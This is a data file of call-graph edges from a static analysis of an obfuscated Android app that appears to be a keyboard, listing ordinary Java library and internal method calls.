STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null value in entry: ") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lql: java.lang.Object get(int)> ==> <iye: void O(int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r1, $r10) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lmo: void <init>(java.util.Comparator)>($r2) in <lqs: void <init>(lkq,java.util.Comparator)> ==> <lmo: void <init>(java.util.Comparator)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r11 = staticinvoke <hny: hny a(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hny: hny a(hmm)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: int[] r()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lsb: boolean hasNext()>
STATIC edge: $r3 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(15) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i1) in <ljd: int b()> ==> <ljd: void A(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorGifSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>($i0, 2) in <izw: int ae(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
STATIC edge: $r2 = staticinvoke <lum: lul g()>() in <lsn: boolean ac()> ==> <lum: lul g()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(">") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: int size()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lqr: int size()>
VIRTUAL edge: virtualinvoke r0.<ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>($i0, $r2, $r1, $i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lqd: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.String toHexString(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.lang.Comparable: int compareTo(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lts: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: int b()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int b()>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw f(java.lang.String)> ==> <ivw: ivv I()>
SPECIAL edge: specialinvoke $r24.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_SUGGESTION_METADATA", 24, 24) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
VIRTUAL edge: $r9 = virtualinvoke $r8.<llo: lma u()>() in <hbv: void j()> ==> <llo: lma u()>
STATIC edge: $i5 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<lqp: void <init>(java.lang.Object[],int,int)>($r2, 0, $i0) in <lqq: lma g()> ==> <lqp: void <init>(java.lang.Object[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqm: java.lang.Object get(int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be greater than size (%s)", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
CLINIT edge: staticinvoke <androidx.core.content.FileProvider: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <androidx.core.content.FileProvider: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lsb: void <init>(int,int)> ==> <lsa: void <init>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void q(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void q(int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lkq: int hashCode()>
STATIC edge: staticinvoke <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>($r3, $r3, $i5, $i0, $i4) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>
VIRTUAL edge: $r6 = virtualinvoke $r4.<lts: lsz c(int)>($i1) in <lsn: boolean ac()> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_IMAGE", 14, 14) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int min(int,int)>($i2, $i1) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int min(int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r11.<lma: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: int size()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: int size()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int a()>() in <lvq: int size()> ==> <lvq: int a()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
CLINIT edge: staticinvoke <lkx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkx: void <clinit>()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(byte[],byte[])>($r4, $r5) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(byte[],byte[])>
SPECIAL edge: specialinvoke $r26.<mag: void <init>(java.lang.String,int,int)>("TENOR_AUTOCOMPLETE_METADATA", 26, 26) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<gcs: void <init>(hbv,lma,int)>(r0, $r9, 12) in <hbv: void j()> ==> <gcs: void <init>(hbv,lma,int)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljf: int b()> ==> <iye: void I(boolean,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, 0) in <lvr: void <init>(java.util.List)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalStateException: void <init>(java.lang.String)>("Recursive update") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: $i4 = staticinvoke <izw: int af(int,int)>($i3, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(13) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<qc: void <init>()>() in <ivw: void <clinit>()> ==> <qc: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map o()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<java.lang.String: int compareTo(java.lang.String)>($r2) in <java.lang.String: int compareTo(java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.String)>
INTERFACE edge: $r0 = interfaceinvoke $r2.<lwi: java.lang.StackTraceElement[] b(java.lang.Class,int)>($r1, $i0) in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.lang.Object k(int)>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_period", class "Llst;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: $r5 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: $r10 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r13) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("extension subtags are out of order: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>($r1) in <lri: void t(java.lang.Object,int)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must be less than size (%s)", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lvr: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r6.<lvs: int compareTo(java.lang.Enum)>($r7) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int compareTo(java.lang.Enum)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: java.util.Iterator iterator()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ivw: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(17) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] x()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(0) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <ljd: java.util.Iterator l()> ==> <java.util.LinkedHashMap: java.util.Set entrySet()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Flag [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingSearchTermMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
CLINIT edge: staticinvoke <jpq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jpq: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(11) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_Initialized", $r3) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lid: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Error: void <init>()> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljd: void A(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.List: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<ljd: void q(int)>(3) in <ljd: void <init>()> ==> <ljd: void q(int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(16) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lkm: java.lang.Object a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>($l2, $l3) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r2, $r5) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean isEmpty()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lvs: lvs a(java.lang.Object)>($r1) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r5.<lqd: lqd c()>() in <lmb: lme f()> ==> <lqd: lqd c()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: $r3 = interfaceinvoke $r5.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lid: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean x(char)>
